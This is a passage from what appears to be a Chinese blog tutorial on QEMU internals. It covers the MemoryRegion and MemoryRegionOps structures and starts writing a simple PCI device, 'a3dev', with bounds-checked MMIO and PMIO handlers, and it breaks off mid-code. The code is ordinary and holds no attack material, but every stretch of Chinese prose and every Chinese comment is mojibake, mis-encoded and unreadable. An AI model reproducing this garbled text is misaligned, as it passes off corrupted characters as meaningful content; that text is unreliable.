class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/** MemoryRegion:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è¡¨ç¤ºä¸€å—å†…å­˜åŒºåŸŸçš„ä¸€ä¸ªç»“æ„ä½“.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryRegion</span> &#123;</span><br>    Object parent_obj;<br><br>    <span class="hljs-comment">/* private: */</span><br><br>    <span class="hljs-comment">/* The following fields should fit in a cache line */</span><br>    <span class="hljs-type">bool</span> romd_mode;<br>    <span class="hljs-type">bool</span> ram;<br>    <span class="hljs-type">bool</span> subpage;<br>    <span class="hljs-type">bool</span> readonly; <span class="hljs-comment">/* For RAM regions */</span><br>    <span class="hljs-type">bool</span> nonvolatile;<br>    <span class="hljs-type">bool</span> rom_device;<br>    <span class="hljs-type">bool</span> flush_coalesced_mmio;<br>    <span class="hljs-type">bool</span> global_locking;<br>    <span class="hljs-type">uint8_t</span> dirty_log_mask;<br>    <span class="hljs-type">bool</span> is_iommu;<br>    RAMBlock *ram_block;<br>    Object *owner;<br><br>    <span class="hljs-type">const</span> MemoryRegionOps *ops;<br>    <span class="hljs-type">void</span> *opaque;<br>    MemoryRegion *container;<span class="hljs-comment">// æŒ‡å‘çˆ¶ MemoryRegion</span><br>    Int128 size;<span class="hljs-comment">// å†…å­˜åŒºåŸŸå¤§å°</span><br>    hwaddr addr;<span class="hljs-comment">// åœ¨çˆ¶ MR ä¸­çš„åç§»é‡</span><br>    <span class="hljs-type">void</span> (*destructor)(MemoryRegion *mr);<br>    <span class="hljs-type">uint64_t</span> align;<br>    <span class="hljs-type">bool</span> terminates;<br>    <span class="hljs-type">bool</span> ram_device;<br>    <span class="hljs-type">bool</span> enabled;<br>    <span class="hljs-type">bool</span> warning_printed; <span class="hljs-comment">/* For reservations */</span><br>    <span class="hljs-type">uint8_t</span> vga_logging_count;<br>    MemoryRegion *alias;<span class="hljs-comment">// ä»…åœ¨ alias MR ä¸­ï¼ŒæŒ‡å‘å®é™…çš„ MR</span><br>    hwaddr alias_offset;<br>    <span class="hljs-type">int32_t</span> priority;<br>    QTAILQ_HEAD(, MemoryRegion) subregions;<br>    QTAILQ_ENTRY(MemoryRegion) subregions_link;<br>    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">unsigned</span> ioeventfd_nb;<br>    MemoryRegionIoeventfd *ioeventfds;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨ Qemu å½“ä¸­æœ‰ä¸‰ç§ç±»å‹çš„ MemoryRegionï¼š</p><ul><li>MemoryRegion æ ¹ï¼šé€šè¿‡ <code>memory_region_init()</code> è¿›è¡Œåˆå§‹åŒ–ï¼Œå…¶ç”¨ä»¥è¡¨ç¤ºä¸ç®¡ç†ç”±å¤šä¸ª sub-MemoryRegion ç»„æˆçš„ä¸€ä¸ªå†…å­˜åŒºåŸŸï¼Œå¹¶ä¸å®é™…æŒ‡å‘ä¸€å—å†…å­˜åŒºåŸŸï¼Œä¾‹å¦‚ <code>system_memory</code></li><li>MemoryRegion å®ä½“ï¼šé€šè¿‡ <code>memory_region_init_ram()</code> åˆå§‹åŒ–ï¼Œè¡¨ç¤ºå…·ä½“çš„ä¸€å—å¤§å°ä¸º size çš„å†…å­˜ç©ºé—´ï¼ŒæŒ‡å‘ä¸€å—å…·ä½“çš„å†…å­˜</li><li>MemoryRegion åˆ«åï¼šé€šè¿‡ <code>memory_region_init_alias()</code> åˆå§‹åŒ–ï¼Œä½œä¸ºå¦ä¸€ä¸ª MemoryRegion å®ä½“çš„åˆ«åè€Œå­˜åœ¨ï¼Œä¸æŒ‡å‘ä¸€å—å®é™…å†…å­˜</li></ul><p>MR å®¹å™¨ä¸ MR å®ä½“é—´æ„æˆæ ‘å½¢ç»“æ„ï¼Œå…¶ä¸­å®¹å™¨ä¸ºæ ¹èŠ‚ç‚¹è€Œå®ä½“ä¸ºå­èŠ‚ç‚¹ï¼š</p><blockquote><p>ä¸‹å›¾æ¥è‡ªäº<a href="https://richardweiyang-2.gitbook.io/understanding_qemu/00-as/02-memoryregion">è¿™é‡Œ</a></p></blockquote><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                       struct MemoryRegion<br>                       +------------------------+                                         <br>                       |<span class="hljs-string">name                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (const char *)        </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">addr                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (hwaddr)              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">size                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (Int128)              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">subregions              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                                  </span>|<br>                                  |<span class="hljs-string"></span><br><span class="hljs-string">          ----+-------------------+---------------------+----</span><br><span class="hljs-string">              </span>|<span class="hljs-string">                                         </span>|<br>              |<span class="hljs-string">                                         </span>|<br>              |<span class="hljs-string">                                         </span>|<br><br>struct MemoryRegion                            struct MemoryRegion<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">name                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">name                    </span>|<br>|<span class="hljs-string">  (const char *)        </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (const char *)        </span>|<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">addr                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">addr                    </span>|<br>|<span class="hljs-string">  (hwaddr)              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (hwaddr)              </span>|<br>|<span class="hljs-string">size                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">size                    </span>|<br>|<span class="hljs-string">  (Int128)              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (Int128)              </span>|<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">subregions              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">subregions              </span>|<br>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<br>+------------------------+                     +------------------------+<br></code></pre></td></tr></table></figure><p>ç›¸åº”åœ°ï¼ŒåŸºäº OOP çš„æ€æƒ³ï¼ŒMemoryRegion çš„æˆå‘˜å‡½æ•°è¢«å°è£…åœ¨å‡½æ•°è¡¨ <code>MemoryRegionOps</code> å½“ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Memory region callbacks</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryRegionOps</span> &#123;</span><br>    <span class="hljs-comment">/* ä»å†…å­˜åŒºåŸŸä¸Šè¯». @addr ä¸ @mr æœ‰å…³; @size å•ä½ä¸ºå­—èŠ‚. */</span><br>    <span class="hljs-type">uint64_t</span> (*read)(<span class="hljs-type">void</span> *opaque,<br>                     hwaddr addr,<br>                     <span class="hljs-type">unsigned</span> size);<br>    <span class="hljs-comment">/* å¾€å†…å­˜åŒºåŸŸä¸Šå†™. @addr ä¸ @mr æœ‰å…³; @size å•ä½ä¸ºå­—èŠ‚. */</span><br>    <span class="hljs-type">void</span> (*write)(<span class="hljs-type">void</span> *opaque,<br>                  hwaddr addr,<br>                  <span class="hljs-type">uint64_t</span> data,<br>                  <span class="hljs-type">unsigned</span> size);<br><br>    MemTxResult (*read_with_attrs)(<span class="hljs-type">void</span> *opaque,<br>                                   hwaddr addr,<br>                                   <span class="hljs-type">uint64_t</span> *data,<br>                                   <span class="hljs-type">unsigned</span> size,<br>                                   MemTxAttrs attrs);<br>    MemTxResult (*write_with_attrs)(<span class="hljs-type">void</span> *opaque,<br>                                    hwaddr addr,<br>                                    <span class="hljs-type">uint64_t</span> data,<br>                                    <span class="hljs-type">unsigned</span> size,<br>                                    MemTxAttrs attrs);<br><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">device_endian</span> <span class="hljs-title">endianness</span>;</span><br>    <span class="hljs-comment">/* Guestå¯è§çº¦æŸ: */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-comment">/* è‹¥é 0ï¼Œåˆ™æŒ‡å®šäº†è¶…å‡ºæœºå™¨æ£€æŸ¥èŒƒå›´çš„è®¿é—®å¤§å°ç•Œé™</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> min_access_size;<br>        <span class="hljs-type">unsigned</span> max_access_size;<br>        <span class="hljs-comment">/* If true, unaligned accesses are supported.  Otherwise unaligned</span><br><span class="hljs-comment">         * accesses throw machine checks.</span><br><span class="hljs-comment">         */</span><br>         <span class="hljs-type">bool</span> unaligned;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * è‹¥å­˜åœ¨ä¸” #false, åˆ™è¯¥äº‹åŠ¡ä¸ä¼šè¢«è®¾å¤‡æ‰€æ¥å—</span><br><span class="hljs-comment">         * (å¹¶å¯¼è‡´æœºå™¨çš„ç›¸å…³è¡Œä¸ºï¼Œä¾‹å¦‚æœºå™¨æ£€æŸ¥å¼‚å¸¸).</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">bool</span> (*accepts)(<span class="hljs-type">void</span> *opaque, hwaddr addr,<br>                        <span class="hljs-type">unsigned</span> size, <span class="hljs-type">bool</span> is_write,<br>                        MemTxAttrs attrs);<br>    &#125; valid;<br>    <span class="hljs-comment">/* å†…éƒ¨åº”ç”¨çº¦æŸ: */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-comment">/* è‹¥é 0ï¼Œåˆ™å†³å®šäº†æœ€å°çš„å®ç°çš„ size .</span><br><span class="hljs-comment">         * æ›´å°çš„ size å°†è¢«å‘ä¸Šå›ç»•ï¼Œä¸”å°†è¿”å›éƒ¨åˆ†ç»“æœ.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> min_access_size;<br>        <span class="hljs-comment">/* è‹¥é 0ï¼Œåˆ™å†³å®šäº†æœ€å¤§çš„å®ç°çš„ size . </span><br><span class="hljs-comment">         * æ›´å¤§çš„ size å°†è¢«ä½œä¸ºä¸€ç³»åˆ—çš„æ›´å°çš„ size çš„è®¿é—®è€Œå®Œæˆ.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> max_access_size;<br>        <span class="hljs-comment">/* è‹¥ä¸º true, æ”¯æŒéå¯¹é½çš„è®¿é—®.  </span><br><span class="hljs-comment">         * å¦åˆ™æ‰€æœ‰çš„è®¿é—®éƒ½å°†è¢«è½¬æ¢ä¸ºï¼ˆå¯èƒ½å¤šç§ï¼‰å¯¹é½çš„è®¿é—®.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">bool</span> unaligned;<br>    &#125; impl;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬çš„ Guest è¦è¯»å†™è™šæ‹Ÿæœºä¸Šçš„å†…å­˜æ—¶ï¼Œåœ¨ Qemu å†…éƒ¨å®é™…ä¸Šä¼šè°ƒç”¨ <code>address_space_rw()</code>ï¼Œå¯¹äºä¸€èˆ¬çš„ RAM å†…å­˜è€Œè¨€åˆ™ç›´æ¥å¯¹ MR å¯¹åº”çš„å†…å­˜è¿›è¡Œæ“ä½œï¼Œå¯¹äº MMIO è€Œè¨€åˆ™æœ€ç»ˆè°ƒç”¨åˆ°å¯¹åº”çš„ <code>MR-&gt;ops-&gt;read()</code> æˆ– <code>MR-&gt;ops-&gt;write()</code></p><p>å…³äº Qemu å†…å­˜ç®¡ç†æ›´å¤šçš„å†…å®¹å°±æš‚ä¸”ä¸åœ¨æ­¤å±•å¼€äº†ï¼Œä¸è¿‡ç°åœ¨æˆ‘ä»¬çŸ¥é“çš„æ˜¯åœ¨ Qemu ä¸­ä½¿ç”¨ <code>MemoryRegion</code> ç»“æ„ä½“æ¥è¡¨ç¤ºä¸€æ®µå†…å­˜åŒºåŸŸï¼Œ<strong>é‚£ä¹ˆæˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡åœ¨è®¾å¤‡ä¸­æ·»åŠ  MemoryRegion çš„æ–¹å¼æ¥ä¸ºè®¾å¤‡æ·»åŠ å†…å­˜ï¼Œä»è€Œå®ç°ä¸è®¾å¤‡é—´çš„ MMIO é€šä¿¡</strong></p><p>åŒæ ·çš„ï¼Œä¸ºäº†ç»Ÿä¸€æ¥å£ï¼Œåœ¨ Qemu å½“ä¸­ <strong>PMIO çš„å®ç°åŒæ ·æ˜¯é€šè¿‡ MemoryRegion æ¥å®Œæˆçš„</strong></p><h2 id="ä¸‰ã€Qemu-ä¸­-PCI-è®¾å¤‡çš„ç¼–å†™">ä¸‰ã€Qemu ä¸­ PCI è®¾å¤‡çš„ç¼–å†™</h2><p>åœ¨è¡¥å……äº†è¿™ä¹ˆå¤šçš„ Qemu ç›¸å…³çš„çŸ¥è¯†ä¹‹åï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹åœ¨ Qemu ä¸­ç¼–å†™ PCI è®¾å¤‡äº†ï¼Œè¿™é‡Œç¬”è€…å°†ç¼–å†™ä¸€ä¸ªæœ€ç®€å•çš„ Qemu è®¾å¤‡ï¼Œå¹¶å°†æºç æ”¾åœ¨ <code>hw/misc/a3dev.c</code> ä¸­</p><p>Qemu å½“ä¸­ PCI è®¾å¤‡å®ä¾‹çš„åŸºç±»æ˜¯ <code>PCIDevice</code>ï¼Œå› æ­¤æˆ‘ä»¬åº”å½“åˆ›å»ºä¸€ä¸ªç»§æ‰¿è‡ª <code>PCIDevice</code> çš„ç±»æ¥è¡¨ç¤ºæˆ‘ä»¬çš„è®¾å¤‡å®ä¾‹ï¼Œè¿™é‡Œç¬”è€…ä»…å£°æ˜äº†ä¸¤ä¸ª <code>MemoryRegion</code> ç”¨ä½œ MMIO ä¸ PMIOï¼Œä»¥åŠä¸€ä¸ªç”¨ä½œæ•°æ®å­˜å‚¨çš„ bufferï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_BUF_SIZE 0x100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br>    <span class="hljs-type">uint8_t</span> buf[A3DEV_BUF_SIZE];<br>&#125; A3PCIDevState;<br></code></pre></td></tr></table></figure><p>ä»¥åŠå®šä¹‰ä¸€ä¸ªç©ºçš„ Class æ¨¡æ¿ï¼Œç»§æ‰¿è‡ª PCI è®¾å¤‡çš„é™æ€ç±»å‹ <code>PCIDeviceClass</code>ï¼Œä¸è¿‡è¿™ä¸€æ­¥å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œäº‹å®ä¸Šæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨ <code>PCIDeviceClass</code> ä½œä¸ºæˆ‘ä»¬è®¾å¤‡ç±»çš„ Classï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDeviceClass parent;<br>&#125; A3PCIDevClass;<br></code></pre></td></tr></table></figure><p>ä»¥åŠä¸¤ä¸ªå°†çˆ¶ç±»è½¬ä¸ºå­ç±»çš„å®ï¼Œå› ä¸º QOM åŸºæœ¬å‡½æ•°ä¼ é€’çš„å¤§éƒ½æ˜¯çˆ¶ç±»æŒ‡é’ˆï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå®æ¥è¿›è¡Œç±»å‹æ£€æŸ¥ + è½¬å‹ï¼Œè¿™ä¹Ÿæ˜¯ Qemu ä¸­æƒ¯ç”¨çš„åšæ³•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3DEV_PCI <span class="hljs-string">&quot;a3dev-pci&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCIDevState, (obj), TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCIDevClass, obj, TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCIDevClass, klass, TYPE_A3DEV_PCI)</span><br></code></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬å¼€å§‹å®šä¹‰ MMIO ä¸ PMIO çš„æ“ä½œå‡½æ•°ï¼Œè¿™é‡Œç¬”è€…å°±ç®€å•åœ°è®¾ç½®ä¸ºè¯»å†™è®¾å¤‡å†…éƒ¨çš„ bufferï¼Œå¹¶å£°æ˜ä¸Šä¸¤ä¸ª MemoryRegion å¯¹åº”çš„å‡½æ•°è¡¨ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œä¼ å…¥çš„ <code>hwaddr</code> ç±»å‹å‚æ•°å…¶å®ä¸ºç›¸å¯¹åœ°å€è€Œéç»å¯¹åœ°å€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br>    <span class="hljs-type">uint64_t</span> val = ~<span class="hljs-number">0LL</span>;<br><br>    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">return</span> val;<br><br>    <span class="hljs-keyword">if</span> (addr + size &gt; A3DEV_BUF_SIZE)<br>        <span class="hljs-keyword">return</span> val;<br>    <br>    <span class="hljs-built_in">memcpy</span>(&amp;val, &amp;ds-&gt;buf[addr], size);<br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">return</span> ;<br><br>    <span class="hljs-keyword">if</span> (addr + size &gt; A3DEV_BUF_SIZE)<br>        <span class="hljs-keyword">return</span> ;<br>    <br>    <span class="hljs-built_in">memcpy</span>(&amp;ds-&gt;buf[addr], &amp;val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_mmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a3dev_read(opaque, addr, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_pmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a3dev_read(opaque, addr, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_mmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    a3dev_write(opaque, addr, val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    a3dev_write(opaque, addr, val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_mmio_ops = &#123;<br>    .read = a3dev_mmio_read,<br>    .write = a3dev_mmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_pmio_ops = &#123;<br>    .read = a3dev_pmio_read,<br>    .write = a3dev_pmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯è®¾å¤‡å®ä¾‹çš„åˆå§‹åŒ–å‡½æ•°ï¼Œåœ¨ <code>PCIDeviceClass</code> å½“ä¸­å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>realize</code> çš„å‡½æ•°æŒ‡é’ˆï¼Œå½“ PCI è®¾å¤‡è¢«è½½å…¥æ—¶ä¾¿ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°æ¥åˆå§‹åŒ–ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¹Ÿå®šä¹‰ä¸€ä¸ªè‡ªå·±çš„åˆå§‹åŒ–å‡½æ•°ï¼Œä¸è¿‡æˆ‘ä»¬éœ€è¦åšçš„å·¥ä½œå…¶å®åŸºæœ¬ä¸Šå°±åªæœ‰åˆå§‹åŒ–ä¸¤ä¸ª <code>MemoryRegion</code>ï¼Œ<code>memory_region_init_io()</code> ä¼šä¸ºè¿™ä¸¤ä¸ª <code>MemoryRegion</code> è¿›è¡Œåˆå§‹åŒ–çš„å·¥ä½œï¼Œå¹¶è®¾ç½®å‡½æ•°è¡¨ä¸ºæˆ‘ä»¬æŒ‡å®šçš„å‡½æ•°è¡¨ï¼Œ<code>pci_register_bar()</code> åˆ™ç”¨æ¥æ³¨å†Œ BARï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_realize</span><span class="hljs-params">(PCIDevice *pci_dev, Error **errp)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(pci_dev);<br><br>    memory_region_init_io(&amp;ds-&gt;mmio, OBJECT(ds), &amp;a3dev_mmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-mmio&quot;</span>, A3DEV_BUF_SIZE);<br>    pci_register_bar(pci_dev, <span class="hljs-number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;ds-&gt;mmio);<br>    memory_region_init_io(&amp;ds-&gt;pmio, OBJECT(ds), &amp;a3dev_pmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-pmio&quot;</span>, A3DEV_BUF_SIZE);<br>    pci_register_bar(pci_dev, <span class="hljs-number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, 